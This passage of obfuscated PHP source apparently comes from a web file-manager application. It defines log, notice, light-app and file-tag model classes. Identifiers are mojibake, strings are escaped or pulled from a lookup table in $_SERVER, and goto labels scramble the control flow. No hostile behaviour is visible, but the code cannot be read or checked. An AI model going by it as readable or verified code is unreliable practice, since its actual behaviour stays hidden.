$×Ÿ‡ÒÉ .= $³¼×™[51] . $Ñ×–æÊØ[0] . $³¼×™[53]; } } return $×Ÿ‡ÒÉ; } } goto F²Ë—å–‘¾; d«ëÒ†¶²‰: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\56\x4c\x69\x67\x68\x74\101\x70\160"; public $modelType = "\123\171\x73\164\x65\155\117\x70\164\x69\x6f\x6e"; public $field = array("\156\x61\x6d\145", "\x67\x72\157\165\160", "\x64\x65\x73\x63", "\143\x6f\156\164\145\x6e\164"); public function listData($Óò¬°…ù = false, $¼íù“½Œ = "\155\x6f\x64\151\146\171\124\151\155\x65", $«Á®­×Ñ = true) { return parent::listData($Óò¬°…ù, $¼íù“½Œ, $«Á®­×Ñ); } public function remove($Â®õÛÎ) { $¾çÒ§Æ§ = $this->findByName($Â®õÛÎ); if (!$¾çÒ§Æ§) { return !1; } return parent::remove($¾çÒ§Æ§[$_SERVER[•Ùç É][445]]); } public function add($ŠÄ¬ÌÙå) { if ($this->findByName($ŠÄ¬ÌÙå[$_SERVER[•Ùç É][32]])) { return !1; } return parent::insert($ŠÄ¬ÌÙå); } public function update($Œ¨â¢àÑ, $ì×áèÀè) { $Ğ—¡ÙÕƒ =& $_SERVER[•Ùç É]; $Ş”ÁŠŸø = $this->findByName($Œ¨â¢àÑ); $·«Û«‹ê = $this->findByName($ì×áèÀè[$Ğ—¡ÙÕƒ[32]]); if (!$Ş”ÁŠŸø || $·«Û«‹ê && $·«Û«‹ê[$Ğ—¡ÙÕƒ[445]] != $Ş”ÁŠŸø[$Ğ—¡ÙÕƒ[445]]) { return !1; } return parent::update($Ş”ÁŠŸø[$Ğ—¡ÙÕƒ[445]], $ì×áèÀè); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\163\164\x65\x6d\137\154\157\147"; protected $dataAuto = array(array("\x63\162\145\141\164\x65\x54\151\155\145", "\164\x69\x6d\145", "\x69\x6e\163\145\162\164", "\146\165\156\x63\x74\151\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ş½Œêª =& $_SERVER[•Ùç É]; return array($ş½Œêª[2241] => LNG($ş½Œêª[2242]), $ş½Œêª[2243] => LNG($ş½Œêª[2244]), $ş½Œêª[1847] => LNG($ş½Œêª[2245]), $ş½Œêª[2246] => LNG($ş½Œêª[2247]), $ş½Œêª[2248] => LNG($ş½Œêª[2249]), $ş½Œêª[2250] => LNG($ş½Œêª[2251]), $ş½Œêª[2252] => LNG($ş½Œêª[2253]), $ş½Œêª[1877] => LNG($ş½Œêª[2253]), $ş½Œêª[1878] => LNG($ş½Œêª[2254]), $ş½Œêª[2255] => LNG($ş½Œêª[2256]), $ş½Œêª[2257] => LNG($ş½Œêª[2258]), $ş½Œêª[2259] => LNG($ş½Œêª[2260]), $ş½Œêª[2261] => LNG($ş½Œêª[2262]), $ş½Œêª[1875] => LNG($ş½Œêª[2263]), $ş½Œêª[2264] => LNG($ş½Œêª[2265]), $ş½Œêª[1882] => LNG($ş½Œêª[2266]), $ş½Œêª[2267] => LNG($ş½Œêª[2268]), $ş½Œêª[2269] => LNG($ş½Œêª[2270]), $ş½Œêª[2271] => LNG($ş½Œêª[2272]), $ş½Œêª[2273] => LNG($ş½Œêª[2274]), $ş½Œêª[1885] => LNG($ş½Œêª[2275]), $ş½Œêª[1886] => LNG($ş½Œêª[2276]), $ş½Œêª[2277] => LNG($ş½Œêª[2278]), $ş½Œêª[2279] => LNG($ş½Œêª[2280]), $ş½Œêª[2281] => LNG($ş½Œêª[2282]), $ş½Œêª[1880] => LNG($ş½Œêª[2283]), $ş½Œêª[2284] => LNG($ş½Œêª[2285]), $ş½Œêª[1879] => LNG($ş½Œêª[2286]), $ş½Œêª[2287] => LNG($ş½Œêª[2288]), $ş½Œêª[2289] => LNG($ş½Œêª[2290]), $ş½Œêª[2291] => LNG($ş½Œêª[2290]), $ş½Œêª[2292] => LNG($ş½Œêª[2293]), $ş½Œêª[2294] => LNG($ş½Œêª[2294]), $ş½Œêª[2295] => LNG($ş½Œêª[1851]), $ş½Œêª[2296] => LNG($ş½Œêª[2297]), $ş½Œêª[2298] => LNG($ş½Œêª[2299]), $ş½Œêª[2300] => LNG($ş½Œêª[2301]), $ş½Œêª[2302] => LNG($ş½Œêª[2303]), $ş½Œêª[2304] => LNG($ş½Œêª[2305]), $ş½Œêª[2306] => LNG($ş½Œêª[2306]), $ş½Œêª[2307] => LNG($ş½Œêª[2308]), $ş½Œêª[2309] => LNG($ş½Œêª[2310]), $ş½Œêª[2311] => LNG($ş½Œêª[2312]), $ş½Œêª[2313] => LNG($ş½Œêª[2314]), $ş½Œêª[2315] => LNG($ş½Œêª[2316]), $ş½Œêª[2317] => LNG($ş½Œêª[2318])); } private function typeFile() { $Ù›‡¬­ =& $_SERVER[•Ùç É]; $ÏÜ¯Ú¨ç = array($Ù›‡¬­[1882] => array($Ù›‡¬­[1883]), $Ù›‡¬­[2259] => array($Ù›‡¬­[2319]), $Ù›‡¬­[2261] => array($Ù›‡¬­[2320]), $Ù›‡¬­[1875] => array($Ù›‡¬­[1876], $Ù›‡¬­[2321]), $Ù›‡¬­[2269] => array(), $Ù›‡¬­[2271] => array(), $Ù›‡¬­[2273] => array(), $Ù›‡¬­[1885] => array($Ù›‡¬­[1887]), $Ù›‡¬­[1886] => array($Ù›‡¬­[1887]), $Ù›‡¬­[2277] => array($Ù›‡¬­[2322]), $Ù›‡¬­[2279] => array($Ù›‡¬­[2322]), $Ù›‡¬­[2281] => array($Ù›‡¬­[2323]), $Ù›‡¬­[2267] => array($Ù›‡¬­[2324]), $Ù›‡¬­[1880] => array($Ù›‡¬­[2325]), $Ù›‡¬­[2284] => array($Ù›‡¬­[2326]), $Ù›‡¬­[1879] => array($Ù›‡¬­[1881])); return $ÏÜ¯Ú¨ç; } private function typeAll() { $Ç¦™£÷Í =& $_SERVER[•Ùç É]; $«š…•Ïœ = $this->typeList; $ş÷¢öĞ¯ = array_filter($this->typeFile()); foreach ($ş÷¢öĞ¯ as $’íÍµëÑ => $ıü‚ç£Ü) { $«š…•Ïœ[$ıü‚ç£Ü[0]] = $«š…•Ïœ[$’íÍµëÑ]; } $«š…•Ïœ[$Ç¦™£÷Í[1887]] = LNG($Ç¦™£÷Í[2327]); $«š…•Ïœ[$Ç¦™£÷Í[2322]] = LNG($Ç¦™£÷Í[2328]); return $«š…•Ïœ; } public function addLog($Ö÷¼…¡», $œ’Şğåê = array()) { $§àŒ•ô =& $_SERVER[•Ùç É]; if (!isset($this->typeList[$Ö÷¼…¡»])) { return; } $éòí«æ = isset($œ’Şğåê[$§àŒ•ô[1705]]) ? $œ’Şğåê[$§àŒ•ô[1705]] : 0; if (!$éòí«æ) { $éòí«æ = Session::get($§àŒ•ô[2041]); } if ($Ö÷¼…¡» == $§àŒ•ô[2296] && is_array($œ’Şğåê[$§àŒ•ô[2329]]) && !$œ’Şğåê[$§àŒ•ô[2329]]) { return; } $—ÊûÚüí = get_client_ip(); if (!$œ’Şğåê || strlen(json_encode($œ’Şğåê)) >= 1024) { $œ’Şğåê = array($§àŒ•ô[2330] => $—ÊûÚüí); } else { if (is_array($œ’Şğåê)) { $œ’Şğåê[$§àŒ•ô[2330]] = $—ÊûÚüí; } else { $œ’Şğåê = array($§àŒ•ô[1253] => $œ’Şğåê, $§àŒ•ô[2330] => $—ÊûÚüí); } } $œ’Şğåê = array($§àŒ•ô[1695] => Session::sign(), $§àŒ•ô[1696] => intval($éòí«æ), $§àŒ•ô[33] => $Ö÷¼…¡», $§àŒ•ô[1698] => json_encode($œ’Şğåê)); parent::add($œ’Şğåê); } public function remove($¤ä·ÇÈÙ) { $this->where(array($_SERVER[•Ùç É][463] => $¤ä·ÇÈÙ))->delete(); } private function _makeOrder($¬¬õÀÏµ = '') { $åØ²Şá =& $_SERVER[•Ùç É]; $‘ìÅ›•Ï = $åØ²Şá[217]; $·×óüŸ» = array($åØ²Şá[493] => $åØ²Şá[494], $åØ²Şá[495] => $åØ²Şá[496]); $‹çï˜¶Ä = Input::get($åØ²Şá[501], $åØ²Şá[7], $åØ²Şá[2077], array($åØ²Şá[1995], $åØ²Şá[495])); $‹çï˜¶Ä = $·×óüŸ»[$‹çï˜¶Ä]; $¬¬õÀÏµ = $¬¬õÀÏµ . "{$‘ìÅ›•Ï}\x20{$‹çï˜¶Ä}"; return $this->order($¬¬õÀÏµ); } public function get($ëú‚ŸÈ¡ = '') { $ŸŸ§Åšõ =& $_SERVER[•Ùç É]; if (!$ëú‚ŸÈ¡) { show_json(array()); } $“úÜÑîØ = array(); if ($ëú‚ŸÈ¡[$ŸŸ§Åšõ[1705]]) { $“úÜÑîØ[$ŸŸ§Åšõ[1705]] = $ëú‚ŸÈ¡[$ŸŸ§Åšõ[1705]]; } if (isset($ëú‚ŸÈ¡[$ŸŸ§Åšõ[805]])) { $Œ¡àã‚ = $ëú‚ŸÈ¡[$ŸŸ§Åšõ[805]]; $ ÅŸ¶Íî = isset($ëú‚ŸÈ¡[$ŸŸ§Åšõ[806]]) ? $ëú‚ŸÈ¡[$ŸŸ§Åšõ[806]] : time(); $“úÜÑîØ[$ŸŸ§Åšõ[217]] = array($ŸŸ§Åšõ[379], array($Œ¡àã‚, $ ÅŸ¶Íî)); } if ($ëú‚ŸÈ¡[$ŸŸ§Åšõ[33]]) { $ª¡õÃ°Ç = explode($ŸŸ§Åšõ[50], $ëú‚ŸÈ¡[$ŸŸ§Åšõ[33]]); $ï£œ¸ªš = $this->typeFile(); $¢§§¬– = array(); foreach ($ª¡õÃ°Ç as $Üßê·üğ) { $¢§§¬–[] = $Üßê·üğ; if (isset($ï£œ¸ªš[$Üßê·üğ])) { $¢§§¬– = array_merge($¢§§¬–, $ï£œ¸ªš[$Üßê·üğ]); } } $¢§§¬– = array_unique($¢§§¬–); if ($¢§§¬–) { $“úÜÑîØ[$ŸŸ§Åšõ[33]] = array($ŸŸ§Åšõ[7], $¢§§¬–); } } else { $“úÜÑîØ[$ŸŸ§Åšõ[33]] = array($ŸŸ§Åšõ[2331], $ŸŸ§Åšõ[2332]); } if (!empty($ëú‚ŸÈ¡[$ŸŸ§Åšõ[2330]])) { $“úÜÑîØ[$ŸŸ§Åšõ[496]] = array($ŸŸ§Åšõ[429], "\45{$ëú‚ŸÈ¡[$ŸŸ§Åšõ[2330]]}\x25"); } $¾µ¯Ÿı³ = $this->_makeOrder()->where($“úÜÑîØ)->selectPage(); if (empty($¾µ¯Ÿı³[$ŸŸ§Åšõ[415]])) { show_json(array(), !0, $¾µ¯Ÿı³[$ŸŸ§Åšõ[412]]); } $¾µ¯Ÿı³[$ŸŸ§Åšõ[415]] = $this->logList($¾µ¯Ÿı³[$ŸŸ§Åšõ[415]]); return $¾µ¯Ÿı³; } private function ipAddress(&$®µ¶íàˆ) { $ıÜÏ£’Ë =& $_SERVER[•Ùç É]; if (!empty($®µ¶íàˆ[$ıÜÏ£’Ë[2330]])) { $Ô¤”–Ñù = IpLocation::get($®µ¶íàˆ[$ıÜÏ£’Ë[2330]]); } else { $Ô¤”–Ñù = LNG($ıÜÏ£’Ë[2333]); } $®µ¶íàˆ[$ıÜÏ£’Ë[2334]] = $Ô¤”–Ñù; } private function descZipDownload($‰èŸë‡è, &$®Îòàã) { $ÒˆÅ±°¶ =& $_SERVER[•Ùç É]; if (!isset($‰èŸë‡è[$ÒˆÅ±°¶[2335]])) { return; } $—‘¡ù’è = json_decode($‰èŸë‡è[$ÒˆÅ±°¶[2335]], !0); foreach ($—‘¡ù’è as $¥°¡ÜÀë) { try { $¼Ñä¸ˆ„ = IO::infoFullSimple($¥°¡ÜÀë[$ÒˆÅ±°¶[86]]); } catch (Exception $Ïßº•™´) { continue; } $‰èŸë‡è[$ÒˆÅ±°¶[86]] = $¥°¡ÜÀë[$ÒˆÅ±°¶[86]]; $®Îòàã[] = $‰èŸë‡è[$ÒˆÅ±°¶[183]] = $¼Ñä¸ˆ„[$ÒˆÅ±°¶[183]]; $®Îòàã[] = $‰èŸë‡è[$ÒˆÅ±°¶[2133]] = $¼Ñä¸ˆ„[$ÒˆÅ±°¶[182]]; break; } return $‰èŸë‡è; } private function getSourceList(&$Ï•óéû›) { $©ÒŒã““ =& $_SERVER[•Ùç É]; $à‘µÓÔ = array(); foreach ($Ï•óéû› as $‘šˆøş° => $‰’Úƒ») { $¦ıä®Ô = json_decode($‰’Úƒ»[$©ÒŒã““[496]], !0); if ($‰’Úƒ»[$©ÒŒã““[33]] == $©ÒŒã““[1878]) { $¦ıä®Ô = $this->descZipDownload($¦ıä®Ô, $à‘µÓÔ); $Ï•óéû›[$‘šˆøş°][$©ÒŒã““[496]] = json_encode($¦ıä®Ô); continue; } if (strpos($‰’Úƒ»[$©ÒŒã““[33]], $©ÒŒã““[2135]) !== 0) { if (!isset($¦ıä®Ô[$©ÒŒã““[86]]) || strpos($‰’Úƒ»[$©ÒŒã““[33]], $©ÒŒã““[2336]) !== 0) { continue; } try { $óïÀ³‚ = IO::infoFullSimple($¦ıä®Ô[$©ÒŒã““[86]]); } catch (Exception $‡ØÌÏš) { continue; } $à‘µÓÔ[] = $¦ıä®Ô[$©ÒŒã““[183]] = $óïÀ³‚[$©ÒŒã““[183]]; $à‘µÓÔ[] = $¦ıä®Ô[$©ÒŒã““[2133]] = $óïÀ³‚[$©ÒŒã““[182]]; $Ï•óéû›[$‘šˆøş°][$©ÒŒã““[496]] = json_encode($¦ıä®Ô); continue; } $à‘µÓÔ[] = $¦ıä®Ô[$©ÒŒã““[183]]; $à‘µÓÔ[] = $¦ıä®Ô[$©ÒŒã““[2133]]; if ($¦ıä®Ô[$©ÒŒã““[33]] == $©ÒŒã““[590]) { $à‘µÓÔ[] = $¦ıä®Ô[$©ÒŒã““[496]][$©ÒŒã““[1211]]; $à‘µÓÔ[] = $¦ıä®Ô[$©ÒŒã““[496]][$©ÒŒã““[1212]]; } if ($¦ıä®Ô[$©ÒŒã““[33]] == $©ÒŒã““[2143]) { $à‘µÓÔ[] = $¦ıä®Ô[$©ÒŒã““[496]][$©ÒŒã““[183]]; } } if (!$à‘µÓÔ) { return array(); } return Model($©ÒŒã““[870])->sourceListInfo($à‘µÓÔ, !0); } private function logList($áĞ·³ôÏ) { $—š›§ =& $_SERVER[•Ùç É]; $¶¯Û¢‘¼ = array_to_keyvalue($áĞ·³ôÏ, $—š›§[12], $—š›§[1705]); $ÂÛŒùÅ = Model($—š›§[569])->userListInfo(array_unique($¶¯Û¢‘¼)); $Ö˜éĞõˆ = $this->getSourceList($áĞ·³ôÏ); $êŸä¥ÀÔ = $this->typeAll(); $åÖâû = array(); $½®×ˆÖÈ = array(); foreach ($áĞ·³ôÏ as $ é”Ÿè => $ş”ĞÈá) { $ù´‚÷± = $ş”ĞÈá[$—š›§[33]]; $¶ŞË­ = isset($ÂÛŒùÅ[$ş”ĞÈá[$—š›§[1705]]]) ? $ÂÛŒùÅ[$ş”ĞÈá[$—š›§[1705]]] : !1; $Ûƒ‘Ìí = strpos($ù´‚÷±, $—š›§[2337]) === 0 ? LNG($—š›§[2338]) : LNG($—š›§[2333]); $ş”ĞÈá[$—š›§[32]] = isset($¶ŞË­[$—š›§[32]]) ? $¶ŞË­[$—š›§[32]] : LNG($—š›§[2333]); $ş”ĞÈá[$—š›§[2187]] = isset($¶ŞË­[$—š›§[2187]]) ? $¶ŞË­[$—š›§[2187]] : $—š›§[12]; $ş”ĞÈá[$—š›§[1593]] = isset($êŸä¥ÀÔ[$ù´‚÷±]) ? $êŸä¥ÀÔ[$ù´‚÷±] : $Ûƒ‘Ìí; $ş”ĞÈá[$—š›§[2076]] = $¶ŞË­; $®òğ§™« = json_decode($ş”ĞÈá[$—š›§[496]], !0); $ş”ĞÈá[$—š›§[2330]] = isset($®òğ§™«[$—š›§[2330]]) ? $®òğ§™«[$—š›§[2330]] : $—š›§[12]; $ş”ĞÈá[$—š›§[2334]] = IpLocation::get($ş”ĞÈá[$—š›§[2330]]); if (strpos($ù´‚÷±, $—š›§[2135]) === 0 || isset($®òğ§™«[$—š›§[2133]])) { $®òğ§™«[$—š›§[89]] = $Ö˜éĞõˆ[$®òğ§™«[$—š›§[183]]]; $®òğ§™«[$—š›§[2148]] = $Ö˜éĞõˆ[$®òğ§™«[$—š›§[2133]]]; if ($®òğ§™«[$—š›§[33]] == $—š›§[590]) { $®òğ§™«[$—š›§[496]][$—š›§[1211]] = $Ö˜éĞõˆ[$®òğ§™«[$—š›§[496]][$—š›§[1211]]]; $®òğ§™«[$—š›§[496]][$—š›§[1212]] = $Ö˜éĞõˆ[$®òğ§™«[$—š›§[496]][$—š›§[1212]]]; } if ($®òğ§™«[$—š›§[33]] == $—š›§[2143]) { $®òğ§™«[$—š›§[496]][$—š›§[183]] = $Ö˜éĞõˆ[$®òğ§™«[$—š›§[496]][$—š›§[183]]]; } if ($®òğ§™«[$—š›§[33]] == $—š›§[1873]) { $®òğ§™«[$—š›§[2148]] = $®òğ§™«[$—š›§[89]]; $®òğ§™«[$—š›§[2133]] = $®òğ§™«[$—š›§[2148]][$—š›§[183]]; $®òğ§™«[$—š›§[89]] = !1; $®òğ§™«[$—š›§[183]] = $—š›§[12]; } if ($®òğ§™«[$—š›§[89]] && $®òğ§™«[$—š›§[89]][$—š›§[180]] == $—š›§[181]) { $½®×ˆÖÈ[] = $ş”ĞÈá[$—š›§[445]]; unset($áĞ·³ôÏ[$ é”Ÿè]); continue; } if ($®òğ§™«[$—š›§[2148]] && $®òğ§™«[$—š›§[2148]][$—š›§[180]] == $—š›§[181]) { $½®×ˆÖÈ[] = $ş”ĞÈá[$—š›§[445]]; unset($áĞ·³ôÏ[$ é”Ÿè]); continue; } } $ş”ĞÈá[$—š›§[496]] = $®òğ§™«; unset($ş”ĞÈá[$—š›§[2339]]); $åÖâû[] = $ş”ĞÈá; } $this->clearSystemPathLog($½®×ˆÖÈ); return $åÖâû; } private function clearSystemPathLog($’Øªåü’) { $òè•ØŒƒ =& $_SERVER[•Ùç É]; if (count($’Øªåü’) == 0) { return; } $ üï“¯Ë = array($òè•ØŒƒ[445] => array($òè•ØŒƒ[7], array_unique($’Øªåü’))); $this->where($ üï“¯Ë)->delete(); } public function deviceList($€Ü‡€Ñƒ, $È×ã§Á = 0) { $ÛğîÔì™ =& $_SERVER[•Ùç É]; $‹İŞ¾Ä = array($ÛğîÔì™[1705] => $€Ü‡€Ñƒ, $ÛğîÔì™[217] => array($ÛğîÔì™[1065], $È×ã§Á), $ÛğîÔì™[33] => $ÛğîÔì™[1847]); $óÖ«£…é = array(); $î“…À¿§ = $this->field($ÛğîÔì™[2340])->where($‹İŞ¾Ä)->order($ÛğîÔì™[2146])->limit(50)->select(); foreach ($î“…À¿§ as $µİâÖİì => $›œÅ®á°) { if ($µİâÖİì > 0 && abs($›œÅ®á°[$ÛğîÔì™[217]] - $î“…À¿§[$µİâÖİì - 1][$ÛğîÔì™[217]]) < 5) { continue; } $‹ÖñºØš = json_decode($›œÅ®á°[$ÛğîÔì™[496]], !0); $›œÅ®á°[$ÛğîÔì™[2330]] = isset($‹ÖñºØš[$ÛğîÔì™[2330]]) ? $‹ÖñºØš[$ÛğîÔì™[2330]] : $ÛğîÔì™[12]; unset($‹ÖñºØš[$ÛğîÔì™[2330]]); $±¬†¥… = $this->deviceType($‹ÖñºØš[$ÛğîÔì™[2136]]); if (isset($óÖ«£…é[$±¬†¥…])) { continue; } $›œÅ®á°[$ÛğîÔì™[2334]] = IpLocation::get($›œÅ®á°[$ÛğîÔì™[2330]]); $›œÅ®á°[$ÛğîÔì™[496]] = $‹ÖñºØš; $óÖ«£…é[$±¬†¥…] = $›œÅ®á°; } return array_values($óÖ«£…é); } public function deviceType($ÙÕ±·ÇÛ) { return $ÙÕ±·ÇÛ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\155\x2e\x6e\x6f\164\151\x63\x65\x4c\x69\x73\x74"; public $field = array("\156\x61\x6d\145", "\143\x6f\x6e\164\x65\x6e\x74", "\x61\165\164\150", "\x6d\x6f\x64\x65", "\164\x69\x6d\x65", "\164\x79\x70\x65", "\x6c\145\x76\x65\154", "\x65\x6e\141\142\x6c\145", "\x73\157\162\x74"); public function listData($é£Õôıê = false, $­İº¿‰š = "\163\x6f\162\164", $©£÷Îğ = false) { return parent::listData($é£Õôıê, $­İº¿‰š, $©£÷Îğ); } public function add($¹ï„Ğä¯) { $²îáÃ ¹ =& $_SERVER[•Ùç É]; $Æ©éé»ó = time(); if ($¹ï„Ğä¯[$²îáÃ ¹[16]] == $²îáÃ ¹[2341]) { $Æ©éé»ó = strtotime($¹ï„Ğä¯[$²îáÃ ¹[196]]); } $¹ï„Ğä¯[$²îáÃ ¹[196]] = $Æ©éé»ó; return parent::insert($¹ï„Ğä¯); } public function update($€×§“áõ, $Œ¯Ä×Ï™) { $ùÛ³ï =& $_SERVER[•Ùç É]; $õññ­‡­ = $this->listData($€×§“áõ); if (!$õññ­‡­) { return !1; } $à²•İÏè = time(); if ($Œ¯Ä×Ï™[$ùÛ³ï[16]] == $ùÛ³ï[2341]) { $à²•İÏè = strtotime($Œ¯Ä×Ï™[$ùÛ³ï[196]]); } $Œ¯Ä×Ï™[$ùÛ³ï[196]] = $à²•İÏè; return parent::update($€×§“áõ, $Œ¯Ä×Ï™); } public function remove($è»æ“ôÛ) { $¬Ñ¥Ãåú = $this->listData($è»æ“ôÛ); if (!$¬Ñ¥Ãåú || $¬Ñ¥Ãåú[$_SERVER[•Ùç É][181]]) { return !1; } return parent::remove($è»æ“ôÛ); } public function sort($â‘§è­é, $ëÌÈ) { return parent::update($â‘§è­é, $ëÌÈ); } public function enable($™‡°™¼ø, $óØÈéÈ´) { return parent::update($™‡°™¼ø, array($_SERVER[•Ùç É][2342] => $óØÈéÈ´)); } private function initUserOption() { $™Ìáœ© =& $_SERVER[•Ùç É]; $this->optionType = $™Ìáœ©[2343]; $this->modelType = $™Ìáœ©[2344]; $this->field = array($™Ìáœ©[2345], $™Ìáœ©[32], $™Ìáœ©[196], $™Ìáœ©[33], $™Ìáœ©[2346], $™Ìáœ©[795], $™Ìáœ©[212]); } public function userNoticeGet($‹šÇ®¾Ó = false) { $this->initUserOption(); return parent::listData($‹šÇ®¾Ó, $_SERVER[•Ùç É][445], !0); } public function userNoticeAdd($û°¥«³) { $ş¨‡ÀŞ =& $_SERVER[•Ùç É]; $this->initUserOption(); $ìíÃç = $this->findByKey($ş¨‡ÀŞ[2345], $û°¥«³[$ş¨‡ÀŞ[445]]); if ($ìíÃç) { return !0; } $¾ªº¼Æ = array($ş¨‡ÀŞ[2345] => $û°¥«³[$ş¨‡ÀŞ[445]], $ş¨‡ÀŞ[32] => $û°¥«³[$ş¨‡ÀŞ[32]], $ş¨‡ÀŞ[196] => $û°¥«³[$ş¨‡ÀŞ[196]], $ş¨‡ÀŞ[33] => isset($û°¥«³[$ş¨‡ÀŞ[33]]) ? $û°¥«³[$ş¨‡ÀŞ[33]] : 1, $ş¨‡ÀŞ[2346] => isset($û°¥«³[$ş¨‡ÀŞ[2346]]) ? $û°¥«³[$ş¨‡ÀŞ[2346]] : 0, $ş¨‡ÀŞ[795] => 0, $ş¨‡ÀŞ[212] => 0); return parent::insert($¾ªº¼Æ); } public function userNoticeEdit($¶±éŠ, $éÆÓş) { $this->initUserOption(); return parent::update($¶±éŠ, $éÆÓş); } } goto c‰”éŠ†Š’; F¶—‡İŸ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\145\162\137\146\141\166"; protected function cacheFunctionAlias($Œ°§¶İ¨) { $ï™úÛ¼ü =& $_SERVER[•Ùç É]; return array($ï™úÛ¼ü[2015] => array($ï™úÛ¼ü[2407] . USER_ID, $ï™úÛ¼ü[2016])); } protected function listData() { $œß”á×µ =& $_SERVER[•Ùç É]; $æ‰ÚåÏ = array($œß”á×µ[1696] => USER_ID, $œß”á×µ[528] => array($œß”á×µ[2019], 0)); $Ó›øä•£ = $œß”á×µ[2408]; $Å¹âŒŒ³ = $this->field($Ó›øä•£)->where($æ‰ÚåÏ)->order($œß”á×µ[2022])->select(); return $Å¹âŒŒ³ ? $Å¹âŒŒ³ : array(); } protected function addToTag($¤õ˜Öéá, $óòàôÈË) { $©Õâ‘Ë• =& $_SERVER[•Ùç É]; if (!Model($©Õâ‘Ë•[2165])->listData($óòàôÈË)) { return !1; } if (is_numeric($¤õ˜Öéá)) { $İ§©•—â = Model($©Õâ‘Ë•[870])->pathInfo($¤õ˜Öéá); if (!$İ§©•—â) { return !1; } } else { $İ§©•—â = IO::infoSimple($¤õ˜Öéá); if (!$İ§©•—â) { return !1; } $ ÔÅÓó = $İ§©•—â[$©Õâ‘Ë•[32]]; $‡¯ªëšç = $İ§©•—â[$©Õâ‘Ë•[33]]; if (isset($İ§©•—â[$©Õâ‘Ë•[455]])) { $‡¯ªëšç = $İ§©•—â[$©Õâ‘Ë•[455]] == $©Õâ‘Ë•[90] ? $©Õâ‘Ë•[77] : $©Õâ‘Ë•[216]; } } $ùç÷Œë¯ = array($©Õâ‘Ë•[1696] => USER_ID, $©Õâ‘Ë•[528] => $óòàôÈË, $©Õâ‘Ë•[465] => $¤õ˜Öéá, $©Õâ‘Ë•[466] => $‡¯ªëšç ? $‡¯ªëšç : $©Õâ‘Ë•[460], $©Õâ‘Ë•[464] => $ ÔÅÓó ? $ ÔÅÓó : $©Õâ‘Ë•[12], $©Õâ‘Ë•[1908] => 0); if ($this->where($ùç÷Œë¯)->find()) { return !1; } return $this->add($ùç÷Œë¯); } protected function removeFromTag($À™¿íòÂ, $¥ë´ˆ£) { $áûÈ…Ñ =& $_SERVER[•Ùç É]; if (!Model($áûÈ…Ñ[2165])->listData($¥ë´ˆ£)) { return !1; } if (is_array($À™¿íòÂ)) { $À™¿íòÂ = array($áûÈ…Ñ[7], $À™¿íòÂ); } $—æÖ…«Ï = array($áûÈ…Ñ[1696] => USER_ID, $áûÈ…Ñ[528] => $¥ë´ˆ£, $áûÈ…Ñ[465] => $À™¿íòÂ); return $this->where($—æÖ…«Ï)->delete(); } protected function removeByTag($ßé‚–Õù) { $Ç›´îìô =& $_SERVER[•Ùç É]; if (!$ßé‚–Õù) { return !1; } $‡Ûç®­º = array($Ç›´îìô[1696] => USER_ID, $Ç›´îìô[528] => $ßé‚–Õù); return $this->where($‡Ûç®­º)->delete(); } protected function removeBySource($“‡ğ¬ÙÜ) { $ÃŒü¦²Ù =& $_SERVER[•Ùç É]; if (is_array($“‡ğ¬ÙÜ)) { $“‡ğ¬ÙÜ = array($ÃŒü¦²Ù[7], $“‡ğ¬ÙÜ); } $›ù‚ù°ª = array($ÃŒü¦²Ù[1696] => USER_ID, $ÃŒü¦²Ù[528] => array($ÃŒü¦²Ù[1065], 0), $ÃŒü¦²Ù[465] => $“‡ğ¬ÙÜ); return $this->where($›ù‚ù°ª)->delete(); } }